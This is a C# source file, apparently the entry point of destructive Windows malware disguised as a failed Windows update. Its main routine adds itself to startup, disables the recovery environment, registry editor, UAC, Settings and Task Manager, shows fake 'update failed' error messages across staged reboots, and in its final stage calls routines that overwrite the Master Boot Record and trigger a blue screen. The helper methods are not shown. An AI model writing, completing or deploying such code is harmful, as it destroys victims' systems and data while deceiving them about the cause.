using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;

namespace Windows_Update_Error
{
    internal static class Program
    {
        /// <summary>
        /// The main entry point of the application. The program execution starts from here and coordinates various operations related to system configuration and function adjustments.
        /// </summary>
        [STAThread]
        static void Main()
        {
            // If you want to customize the application configuration, such as setting high DPI settings or default fonts, refer to https://aka.ms/applicationconfiguration.
            // This line of code initializes the application configuration according to the guidelines in the above link.
            ApplicationConfiguration.Initialize();

            // Create an instance of the Regedit_Set class. This instance will be used to perform operations related to registry settings and system startup configuration.
            Regedit_Set regedit1 = new Regedit_Set();
            // Create an instance of the Test class. This instance is responsible for executing various tests and operations, such as disabling specific Windows features, handling computer shutdown or restart situations, etc.
            Test test1 = new Test();

            // Call the Start_Detection method of the regedit1 object to obtain the startup code. This startup code will be used for decision-making in the subsequent program logic.
            string regedit1_Start = regedit1.Start_Detection();

            const string str1 = "114514";
            const string str2 = "8479838";
            const string str3 = "7453567";
            const string str4 = "84634846";
            const string str5 = "847327473";

            try
            {
                // Call the PC_Start method of the regedit1 object. This method is responsible for adding the program to the computer's startup items and modifying the critical system startup settings according to the program's requirements.
                regedit1.PC_Start();
                // Call the Disable_WinRE method of the test1 object to disable the Windows Recovery Environment, which will limit access to system recovery options.
                test1.Disable_WinRE();
                // Use the Disable_Regedit method of the regedit1 object to disable access to the system registry, which helps to restrict users from making unauthorized changes to the registry.
                regedit1.Disable_Regedit();
            }
            catch (Exception ex)
            {
                // If any of the above operations encounter an exception, this code block will catch the exception and display the error message through a message box. The message box contains an "OK" button and displays an error icon to alert the user that a problem has occurred.
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            // Call the UAC_OFF method of the regedit1 object to turn off the User Account Control (UAC) feature, which may change the security prompts and access permission levels in the system.
            regedit1.UAC_OFF();
            // Call the Disable_Settings method of the regedit1 object to disable access to system settings and the Task Manager, which will limit users from modifying system configurations and managing running processes.
            regedit1.Disable_Settings();

            // Pause the program execution for 5 seconds. This might be to allow some background operations to complete or to give the system time to apply the changes made so far.
            Thread.Sleep(5000);

            switch (regedit1_Start)
            {
                case str1:
                    regedit1_Start = "8479838";
                    // Update the startup code to the specified value, then call the Start_Update method of the regedit1 object to apply the updated startup code to the relevant system configuration. After that, restart the computer to make the changes take effect.
                    regedit1.Start_Update(regedit1_Start);
                    test1.Shutdown_PC();
                    break;
                case str2:
                    regedit1_Start = "7453567";
                    regedit1.Start_Update(regedit1_Start);
                    // Display a message box indicating that the update has failed and Windows cannot repair the computer, thus informing the user of the problem occurred during the update process.
                    msg1();
                    // Start the application with a newly created instance of Form2. This might launch a specific user interface or form for further interaction or to display relevant information.
                    Application.Run(new Form2());
                    break;
                case str3:
                    regedit1_Start = "84634846";
                    regedit1.Start_Update(regedit1_Start);
                    // Display a message box to inform the user that an unknown error has occurred and Windows components cannot be loaded normally, helping the user understand the reason for the failure.
                    msg2();
                    Application.Run(new Form2());
                    break;
                case str4:
                    regedit1_Start = "847327473";
                    regedit1.Start_Update(regedit1_Start);
                    // Display a message box stating that the computer cannot restore important Windows components, letting the user know the problem existing in the system functionality.
                    msg3();
                    Application.Run(new Form2());
                    break;
                case str5:
                    // Call the killmbrA method of the test1 object to tamper with the hard disk's Master Boot Record (MBR). This is a critical operation that may have a significant impact on the system's ability to boot.
                    test1.killmbrA();
                    //test1.killmbr();
                    // Call the Nt_Error method of the test1 object to trigger the Blue Screen of Death (BSOD) situation, which usually indicates that a serious error has occurred in the system.
                    test1.Nt_Error();
                    break;
                default:
                    // Call the killmbrA method of the test1 object to tamper with the hard disk's Master Boot Record (MBR). This is a critical operation that may have a significant impact on the system's ability to boot.
                    test1.killmbrA();
                    //test1.killmbr();
                    // Call the Nt_Error method of the test1 object to trigger the Blue Screen of Death (BSOD) situation, which usually indicates that a serious error has occurred in the system.
                    test1.Nt_Error();
                    break;
            }

            void msg1()
            {
                MessageBox.Show("Update failed. Windows cannot repair your computer.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            void msg2()
            {
                MessageBox.Show("Unable to load Windows components due to an unknown error.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            void msg3()
            {
                MessageBox.Show("The computer cannot restore important Windows components.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}